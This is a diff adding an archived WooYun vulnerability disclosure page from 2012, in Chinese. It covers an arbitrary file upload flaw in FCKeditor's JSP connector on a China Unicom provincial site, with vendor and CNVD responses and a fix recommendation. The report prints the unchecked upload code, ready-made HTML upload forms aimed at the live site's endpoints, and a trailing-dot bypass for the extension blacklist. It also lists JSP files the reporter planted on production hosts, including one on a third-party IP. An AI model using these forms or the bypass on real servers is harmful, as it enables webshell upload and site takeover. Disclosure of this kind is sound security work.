@@ -1,0 +1,539 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		中国联通某省站点任意文件上传  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		中国联通某省站点任意文件上传  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/possible">possible</a> 
+</li><li>提交时间：		2012-05-21 18:37</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-05-21：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-05-23：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-06-02：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-06-12：	细节向普通白帽子公开<br/>
+									2012-06-22：	细节向实习白帽子公开<br/>
+									2012-07-05：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">没啥说的，看到大神发的http://www.wooyun.org/bugs/wooyun-2010-05810已经公布了，但是漏洞没修补，就这样就公布呀，想 是不是联通不知道怎么修补呀，就简单在发一个类似的问题。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">不好意思直接用人家发过的，就在找一个吧，天津的。<br />
+<br />
+文件上传点<br />
+<br />
+www.tj.chinaunicom.com/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=FileUpload&amp;Type=Image&amp;CurrentFolder=/<br />
+<br />
+<br />
+<br />
+FCK上传点，看一下web.xml<br />
+<br />
+&lt;servlet-name&gt;Connector&lt;/servlet-name&gt;<br />
+<br />
+		&lt;servlet-class&gt;<br />
+<br />
+			com.fredck.FCKeditor.connector.ConnectorServlet<br />
+<br />
+类似是这样，该上传点，对应的class是com.fredck.FCKeditor.connector.ConnectorServlet.class<br />
+<br />
+该类一般在FCKeditor-2.3.jar(不同版本不相同，说实话我仅测试了这个版本的)<br />
+<br />
+源代码中有这样两个方法<br />
+<br />
+  public void doGet(HttpServletRequest request, HttpServletResponse response)<br />
+<br />
+  public void doPost(HttpServletRequest request, HttpServletResponse response)<br />
+<br />
+<br />
+<br />
+doget是大家经常用的就不说了，就是获得所有上传文件列表。<br />
+<br />
+<br />
+<br />
+dopost其实就是FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/jsp/connector 页面最终上传文件在后台执行的页面，<br />
+<br />
+<br />
+<br />
+而看一下dopost的实现<br />
+<br />
+  public void doPost(HttpServletRequest request, HttpServletResponse response)<br />
+<br />
+    throws ServletException, IOException<br />
+<br />
+  {<br />
+<br />
+    if (debug) System.out.println(&quot;--- BEGIN DOPOST ---&quot;);<br />
+<br />
+    request.setCharacterEncoding(&quot;utf-8&quot;);<br />
+<br />
+    response.setContentType(&quot;text/html; charset=UTF-8&quot;);<br />
+<br />
+    response.setHeader(&quot;Cache-Control&quot;, &quot;no-cache&quot;);<br />
+<br />
+    PrintWriter out = response.getWriter();<br />
+<br />
+<br />
+<br />
+    String commandStr = request.getParameter(&quot;Command&quot;);<br />
+<br />
+    String typeStr = request.getParameter(&quot;Type&quot;);<br />
+<br />
+    String currentFolderStr = &quot;&quot;;<br />
+<br />
+<br />
+<br />
+    currentFolderStr = new String(request.getParameter(&quot;CurrentFolder&quot;).getBytes(&quot;ISO8859_1&quot;), &quot;UTF-8&quot;);<br />
+<br />
+<br />
+<br />
+    String realFileName = new String(request.getParameter(&quot;realFileName&quot;).getBytes(&quot;ISO8859_1&quot;), &quot;UTF-8&quot;);<br />
+<br />
+    String[] qmh_pathParts = realFileName.replace(&#039;\\&#039;, &#039;/&#039;).split(&quot;/&quot;);<br />
+<br />
+    realFileName = qmh_pathParts[(qmh_pathParts.length - 1)];<br />
+<br />
+<br />
+<br />
+    String currentPath = baseDir + typeStr + currentFolderStr;<br />
+<br />
+    String currentDirPath = getServletContext().getRealPath(currentPath);<br />
+<br />
+    if (debug) System.out.println(currentDirPath);<br />
+<br />
+<br />
+<br />
+    String retVal = &quot;0&quot;;<br />
+<br />
+    String newName = &quot;&quot;;<br />
+<br />
+<br />
+<br />
+    if (!commandStr.equals(&quot;FileUpload&quot;)) {<br />
+<br />
+      retVal = &quot;203&quot;;<br />
+<br />
+    } else {<br />
+<br />
+      DiskFileUpload upload = new DiskFileUpload();<br />
+<br />
+      upload.setRepositoryPath(getServletContext().getRealPath(baseDir) + &quot;\\temp\\&quot;);<br />
+<br />
+      try<br />
+<br />
+      {<br />
+<br />
+        List items = upload.parseRequest(request);<br />
+<br />
+        Map fields = new HashMap();<br />
+<br />
+        Iterator iter = items.iterator();<br />
+<br />
+        while (iter.hasNext()) {<br />
+<br />
+          FileItem item = (FileItem)iter.next();<br />
+<br />
+          if (item.isFormField())<br />
+<br />
+            fields.put(item.getFieldName(), item.getString());<br />
+<br />
+          else<br />
+<br />
+            fields.put(item.getFieldName(), item);<br />
+<br />
+        }<br />
+<br />
+        FileItem uplFile = (FileItem)fields.get(&quot;NewFile&quot;);<br />
+<br />
+<br />
+<br />
+        String fileName = realFileName;<br />
+<br />
+        String nameWithoutExt = getNameWithoutExtension(fileName);<br />
+<br />
+        String ext = getExtension(fileName);<br />
+<br />
+        File pathToSave = new File(currentDirPath, fileName);<br />
+<br />
+        int counter = 1;<br />
+<br />
+<br />
+<br />
+        while (pathToSave.exists()) {<br />
+<br />
+          newName = nameWithoutExt + &quot;(&quot; + counter + &quot;)&quot; + &quot;.&quot; + ext;<br />
+<br />
+          retVal = &quot;201&quot;;<br />
+<br />
+          pathToSave = new File(currentDirPath, newName);<br />
+<br />
+          counter++;<br />
+<br />
+        }<br />
+<br />
+<br />
+<br />
+        uplFile.write(pathToSave);<br />
+<br />
+      } catch (Exception ex) {<br />
+<br />
+        ex.printStackTrace();<br />
+<br />
+        retVal = &quot;203&quot;;<br />
+<br />
+      }<br />
+<br />
+<br />
+<br />
+    }<br />
+<br />
+<br />
+<br />
+    out.println(&quot;&lt;script type=\&quot;text/javascript\&quot;&gt;&quot;);<br />
+<br />
+    out.println(&quot;window.parent.frames[&#039;frmUpload&#039;].OnUploadCompleted(&quot; + retVal + &quot;,&#039;&quot; + newName + &quot;&#039;);&quot;);<br />
+<br />
+    out.println(&quot;&lt;/script&gt;&quot;);<br />
+<br />
+    out.flush();<br />
+<br />
+    out.close();<br />
+<br />
+<br />
+<br />
+    if (debug) System.out.println(&quot;--- END DOPOST ---&quot;);<br />
+<br />
+  }<br />
+<br />
+不用说，典型上传漏洞，未对文件后缀限制，这个其实是FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/jsp/connector<br />
+<br />
+上传漏洞的根源，有些站点以为删除了FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/jsp/connector就防住了漏洞，其实完<br />
+<br />
+<br />
+<br />
+全可以自己构造，如:<br />
+<br />
+&lt;body &gt;<br />
+<br />
+&lt;form action =&quot;http://www.tj.chinaunicom.com/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?<br />
+<br />
+<br />
+<br />
+Command=FileUpload&amp;Type=Image&amp;CurrentFolder=/&quot; method=&quot;post&quot; name=&quot;form1&quot; enctype=&quot;multipart/form-data&quot;&gt;<br />
+<br />
+ &lt;input name=&quot;NewFile&quot; type=&quot;FILE&quot;  &gt;<br />
+<br />
+  &lt;input type=&quot;submit&quot; name=&quot;Submit&quot; value=&quot;上传&quot; &gt;<br />
+<br />
+&lt;/form&gt;<br />
+<br />
+&lt;/body&gt;<br />
+<br />
+保存成html就可以实现上传。<br />
+<br />
+<br />
+<br />
+题外话:<br />
+<br />
+对该编辑器简单看一下还有一个上传点:web.xml中配置如下:<br />
+<br />
+&lt;servlet-name&gt;SimpleUploader&lt;/servlet-name&gt;<br />
+<br />
+		&lt;servlet-class&gt;<br />
+<br />
+			com.fredck.FCKeditor.uploader.SimpleUploaderServlet<br />
+<br />
+		&lt;/servlet-class&gt;<br />
+<br />
+	&lt;servlet-name&gt;SimpleUploader&lt;/servlet-name&gt;<br />
+<br />
+		&lt;url-pattern&gt;<br />
+<br />
+			/FCKeditor/editor/filemanager/upload/simpleuploader<br />
+<br />
+		&lt;/url-pattern&gt;<br />
+<br />
+<br />
+<br />
+因此上传处理class是com.fredck.FCKeditor.uploader.SimpleUploaderServlet.class，打开源代码看一下，初次看来做的很好，有后缀限制<br />
+<br />
+但是细看还是可能存在问题，主要在如下函数中判断后缀<br />
+<br />
+<br />
+<br />
+  private boolean extIsAllowed(String fileType, String ext)<br />
+<br />
+  {<br />
+<br />
+    ext = ext.toLowerCase();<br />
+<br />
+<br />
+<br />
+    ArrayList allowList = (ArrayList)allowedExtensions.get(fileType);<br />
+<br />
+    ArrayList denyList = (ArrayList)deniedExtensions.get(fileType);<br />
+<br />
+<br />
+<br />
+    if (allowList.size() == 0)<br />
+<br />
+    {<br />
+<br />
+      return !denyList.contains(ext);<br />
+<br />
+    }<br />
+<br />
+<br />
+<br />
+    if (denyList.size() == 0)<br />
+<br />
+    {<br />
+<br />
+      return allowList.contains(ext);<br />
+<br />
+    }<br />
+<br />
+<br />
+<br />
+    return false;<br />
+<br />
+  }<br />
+<br />
+是一个黑名单和白名单的问题，如果web.xml中没有设置白名单，就会变成黑名单检查，黑名单你懂的，很容易绕过。<br />
+<br />
+看了一些站点web.xml关于fck的配置都类似这样<br />
+<br />
+&lt;init-param&gt;<br />
+<br />
+			&lt;param-name&gt;AllowedExtensionsFile&lt;/param-name&gt;<br />
+<br />
+			&lt;param-value&gt;&lt;/param-value&gt;<br />
+<br />
+		&lt;/init-param&gt;<br />
+<br />
+		&lt;init-param&gt;<br />
+<br />
+			&lt;param-name&gt;DeniedExtensionsFile&lt;/param-name&gt;<br />
+<br />
+			&lt;param-value&gt;<br />
+<br />
+				php|php3|php5|phtml|asp|aspx|ascx|jsp|cfm|cfc|pl|bat|exe|dll|reg|cgi<br />
+<br />
+			&lt;/param-value&gt;<br />
+<br />
+		&lt;/init-param&gt;<br />
+<br />
+对File类型是白名单为空，黑名单检查，大家都明白怎么绕过了，<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+&lt;body &gt;<br />
+<br />
+&lt;form action =&quot;http://www.tj.chinaunicom.com/FCKeditor/editor/filemanager/upload/simpleuploader??Command=FileUpload&amp;Type=File&amp;CurrentFolder=/&quot; method=&quot;post&quot; <br />
+<br />
+<br />
+<br />
+name=&quot;form1&quot; enctype=&quot;multipart/form-data&quot;&gt;<br />
+<br />
+ &lt;input name=&quot;NewFile&quot; type=&quot;FILE&quot;  &gt;<br />
+<br />
+  &lt;input type=&quot;submit&quot; name=&quot;Submit&quot; value=&quot;上传&quot; &gt;<br />
+<br />
+&lt;/form&gt;<br />
+<br />
+&lt;/body&gt;<br />
+<br />
+上传的时候 简单的在后面名后加个点(windows系统)就可以，如果没写明白，看看以前写在这里的<br />
+<br />
+http://hi.baidu.com/possible_1/blog/item/fa5d6731f933cb729922ed95.html<br />
+<br />
+如果还名看明白，就是因为我没写清楚 呵呵 <br />
+<br />
+<br />
+<br />
+没有去看这个站上到底有什么 害怕被抓，大公司惹不起....<br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">黑名单被绕过<br />
+<br />
+</p><p class="detail"><a href="../images/2118190838b79edc7035a5da2c391e7ee00649f4.jpg" target="_blank"><img src="../images/2118190838b79edc7035a5da2c391e7ee00649f4.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+证明一下来过<br />
+<br />
+http://www.tj.chinaunicom.com/upload/UserFiles/Image/job.jsp<br />
+<br />
+http://www.tj.chinaunicom.com/upload/UserFiles/File/test.jsp<br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">其实修复很简单，但不是像http://121.31.254.132:8088/ 简单删除一个html就可以，证明一下 这个修复是不安全的<br />
+<br />
+http://121.31.254.132:8088/UserFiles/Image/login.jsp<br />
+<br />
+<br />
+<br />
+给出修复建议：<br />
+<br />
+完全使用com.fredck.FCKeditor.uploader.SimpleUploaderServlet类上传，同时在web.xml添加<br />
+<br />
+&lt;param-name&gt;AllowedExtensionsFile&lt;/param-name&gt;<br />
+<br />
+			&lt;param-value&gt;&lt;/param-value&gt;项，使得不为空，继而上传变成白名单检查<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+到底联通有多少jsp 使用有漏洞的fck，不知道不当雷锋了，据说联通很有钱，据说有钱的都抠，那还免费测啥呀... </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/possible" title="possible">possible</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-07387" title="中国联通某省站点任意文件上传">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：14 </p>
+													<p class="detail">确认时间：2012-05-23 11:04</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">CNVD确认漏洞情况，复现部分过程。鉴于此前涉事单位所属分公司处置力度情况，转由CNCERT协调集团公司处置，并作为典型事件抄报电信行业相关单位。不止一家单位存在这样的问题。<br />
+<br />
+对该漏洞评分如下：<br />
+CVSS评分：(AV:R/AC:L/Au:NR/C:C/A:P/I:P/B:N) Score:8.97（最高10分，高危)<br />
+即：远程攻击、攻击难度低、不需要用户认证，对机密性造成完全影响，对可用性、完整性造成部分影响。<br />
+<br />
+技术难度系数：1.2(应致谢possible同学的整套技术讲解)<br />
+影响危害系数：1.3(较严重，暂不归类为通用软件漏洞，不过评估影响较广泛)<br />
+<br />
+综合评分：8.97*1.2*1.3=13.993</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="7387";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
